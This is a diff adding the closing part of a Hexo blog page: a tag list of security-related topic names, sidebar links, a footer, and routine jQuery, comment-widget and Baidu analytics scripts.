+			<li><a href="/tag/12306刷票外挂/" title="12306刷票外挂">12306刷票外挂<sup>1</sup></a></li>
+		
+			<li><a href="/tag/12306刷票外挂下载/" title="12306刷票外挂下载">12306刷票外挂下载<sup>1</sup></a></li>
+		
+			<li><a href="/tag/1521/" title="1521">1521<sup>1</sup></a></li>
+		
+			<li><a href="/tag/3389/" title="3389">3389<sup>1</sup></a></li>
+		
+			<li><a href="/tag/360/" title="360">360<sup>1</sup></a></li>
+		
+			<li><a href="/tag/3600safe/" title="3600safe">3600safe<sup>1</sup></a></li>
+		
+			<li><a href="/tag/360浏览器抢票专版/" title="360浏览器抢票专版">360浏览器抢票专版<sup>1</sup></a></li>
+		
+			<li><a href="/tag/61398/" title="61398">61398<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ACL/" title="ACL">ACL<sup>1</sup></a></li>
+		
+			<li><a href="/tag/APT/" title="APT">APT<sup>3</sup></a></li>
+		
+			<li><a href="/tag/ARP/" title="ARP">ARP<sup>2</sup></a></li>
+		
+			<li><a href="/tag/ASP/" title="ASP">ASP<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ASP中FSO的神奇功能/" title="ASP中FSO的神奇功能">ASP中FSO的神奇功能<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ATM/" title="ATM">ATM<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ActionScript中shellcode的定位和提取/" title="ActionScript中shellcode的定位和提取">ActionScript中shellcode的定位和提取<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ActionScript的反汇编和反编译/" title="ActionScript的反汇编和反编译">ActionScript的反汇编和反编译<sup>1</sup></a></li>
+		
+			<li><a href="/tag/Acunetix-Web-Vulnerability-Scanner/" title="Acunetix Web Vulnerability Scanner">Acunetix Web Vulnerability Scanner<sup>1</sup></a></li>
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">Links</p>
+    <ul>
+      <li><a href="http://blog.csdn.net/dreajay" target="_blank" title="dreajay csdn">CSDN</a></li>
+      <li><a href="https://github.com/dreajay" target="_blank" title="dreajay github">github</a></li>
+      <li><a href="http://www.douban.com/people/72514701/" target="_blank" title="dreajay豆瓣">豆瓣</a></li>
+    </ul>
+</div>
+
+
+  <div class="rsspart">
+	<a href="atom.xml" target="_blank" title="rss">RSS</a>
+</div>
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	
+	<section class="info">
+		<p> 没有礁石，就没有美丽的浪花；没有挫折，就没有壮丽的人生！ <br/>
+			再长的路，一步步也能走完，再短的路，不迈开双脚也无法到达，平凡的脚步也可以走完伟大的行程！</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		<a href="http://weibo.com/111" target="_blank" title="weibo"></a>
+		
+		
+		<a href="https://twitter.com/333" target="_blank" title="twitter"></a>
+		
+		
+		<a href="https://github.com/333" target="_blank" title="github"></a>
+		
+		
+	</div>
+		<p class="copyright">Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/A-limon/pacman" target="_blank" title="pacman">pacman</a> © 2016 
+		
+		<a href="http://ha.cker.in" target="_blank" title="Secer">Secer</a>
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.1.0.min.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else
+    {
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+        
+    }
+  });
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      h  = $('article h2')
+      ah = $('article h2'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  if(ah.length==0){
+    t.css('display','none');
+  }else{
+    c.click(function(){
+      ta.css('display', 'block').addClass('fadeIn');
+    });
+    o.click(function(){
+      ta.css('display', 'none');
+    });
+    $(window).scroll(function(){
+      ta.css("top",Math.max(140,320-$(this).scrollTop()));
+    });
+  };
+});
+</script>
+
+
+
+<script type="text/javascript">
+  var duoshuoQuery = {short_name:"dreajaygithubblog"};
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0] 
+    || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+</script> 
+
+
+
+
+
+
+
+
+<script type="text/javascript">
+var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3F77edef7e6931022edbd2322ec66456e1' type='text/javascript'%3E%3C/script%3E"));
+</script>
+
+<div id="totop" style="position:fixed;bottom:150px;right:50px;cursor: pointer;">
+	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
+</div>
+<script type="text/javascript">
+	(function($) { 
+		// When to show the scroll link
+		// higher number = scroll link appears further down the page   
+		var upperLimit = 300;
+		
+		// Our scroll link element
+		var scrollElem = $('#totop');
+	   
+		// Scroll to top speed
+		var scrollSpeed = 800;
+	   
+		// Show and hide the scroll to top link based on scroll position   
+		scrollElem.hide();
+		$(window).scroll(function () {            
+			var scrollTop = $(document).scrollTop();       
+			if ( scrollTop > upperLimit ) {
+				$(scrollElem).stop().fadeTo(300, 1); // fade back in           
+			}else{       
+				$(scrollElem).stop().fadeTo(300, 0); // fade out
+			}
+		});
+		// Scroll to top animation on click
+		$(scrollElem).click(function(){
+			$('html, body').animate({scrollTop:0}, scrollSpeed); return false;
+		});
+	})(jQuery);
+</script>
+
+
+  </body>
 </html>
+
